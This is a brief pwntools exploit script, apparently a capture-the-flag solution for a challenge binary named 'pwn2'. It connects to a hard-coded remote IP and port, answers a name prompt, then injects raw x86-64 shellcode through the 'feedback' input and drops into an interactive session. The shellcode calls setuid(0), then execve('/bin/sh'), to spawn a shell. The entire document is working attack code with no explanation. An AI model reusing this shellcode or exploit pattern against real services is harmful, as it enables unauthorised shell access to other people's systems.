#!/usr/bin/env python3

from pwn import *

HOST = "139.180.137.100"
PORT = 1338

context.binary = elf = ELF('./pwn2', checksec = False)
# p = process(elf.path)
p = remote(HOST, PORT)

shellcode = b'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'
p.sendafter(b'Give me your name: ', b'abc')
p.sendafter(b'What do you think about the contest (feedback) ?\n', shellcode)

p.interactive()